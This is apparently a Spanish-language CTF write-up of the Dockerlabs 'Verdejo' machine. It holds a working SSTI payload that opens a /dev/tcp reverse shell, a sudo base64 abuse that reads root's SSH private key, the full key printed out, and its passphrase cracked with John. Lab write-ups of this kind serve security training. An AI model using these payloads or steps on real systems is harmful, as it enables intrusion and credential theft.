---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `SSTI` `Python` `John` `Sudoers` `Information Leakage`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip verdejo.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh verdejo.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80,8089 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 14:02 +0100
Nmap scan report for 172.17.0.2
Host is up (0.000023s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
|_  256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8089/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Dale duro bro
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```

Identificamos los puertos `22` (SSH), `80` (HTTP) y `8089` abiertos.

Accedemos al servicio web del puerto `80` pero solo encontramos la página por defecto de `Apache2`. 

Procedemos a inspeccionar el puerto `8089`, donde nos encontramos con un input box.

Intentamos una `inyección de comandos` clásica utilizando `;`, pero no obtenemos ningún resultado.

![](../../images/semicolon.png)

A continuación, probamos a ver si la aplicación es vulnerable a `SSTI` (Server-Side Template Injection) introduciendo la operación matemática `{{7*7}}` en el input.

![](../../images/49.png)

Vemos que funciona correctamente y el sistema procesa la multiplicación devolviendo 49.

Decidimos aprovechar esta vulnerabilidad `SSTI` para obtener una `reverse shell`. 

Primero, ponemos un `listener` en nuestra máquina atacante.

```Bash
sudo nc -nlvp 4444
```

Inyectamos el siguiente payload malicioso aprovechando la librería os de Python:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"').read() }}
```

Info:
```
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34112
bash: cannot set terminal process group (96): Inappropriate ioctl for device
bash: no job control in this shell
verde@2670a07b3997:~$
```

Recibimos la conexión con éxito como el usuario `verde`.

## TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```

`ctrl Z`

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```Bash
sudo -l
```

Info:
```
Matching Defaults entries for verde on 2670a07b3997:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User verde may run the following commands on 2670a07b3997:
    (root) NOPASSWD: /usr/bin/base64
```

Observamos que podemos ejecutar el binario `/usr/bin/base64` con privilegios de `root` sin contraseña. Podemos aprovechar esto para leer archivos privilegiados del sistema.

Nuestro objetivo será leer la `clave privada SSH` del usuario `root`.

```Bash
sudo -u root /usr/bin/base64 /root/.ssh/id_rsa | /usr/bin/base64 -d
```

Info:
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
vEACJSQrQKz9mWnewtRP5pzZk=
-----END OPENSSH PRIVATE KEY-----
```

Obtenemos la `clave privada de root`. La copiamos y la guardamos en un archivo llamado `id_rsa` en nuestra máquina atacante.

Le asignamos los permisos necesarios para poder utilizarla.

```Bash
chmod 600 id_rsa
```

Intentamos autenticarnos como root.

```Bash
ssh -i id_rsa root@172.17.0.2
```

Sin embargo, al intentar conectar nos solicita una passphrase que desconocemos.

Para averiguarla, primero necesitamos convertir la clave privada `id_rsa` a un formato que `John The Ripper` pueda procesar. 

Utilizamos la herramienta `ssh2john` para generar el `hash`.

```Bash
ssh2john id_rsa > hash.txt
```

Una vez tenemos el `hash`, lanzamos un ataque de fuerza bruta utilizando el diccionario `rockyou.txt`.

```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Info:
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:02:54 DONE (2026-02-16 14:22) 0.005732g/s 20.36p/s 20.36c/s 20.36C/s indiana..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Conseguimos crackear la contraseña: `honda1`.

Finalmente, volvemos a intentar el acceso vía `SSH` utilizando la clave y la contraseña obtenida.

```Bash
ssh -i id_rsa root@172.17.0.2
#password honda1
```

```
root@2670a07b3997:~# whoami
root
root@2670a07b3997:~#
```

Ya somos root!


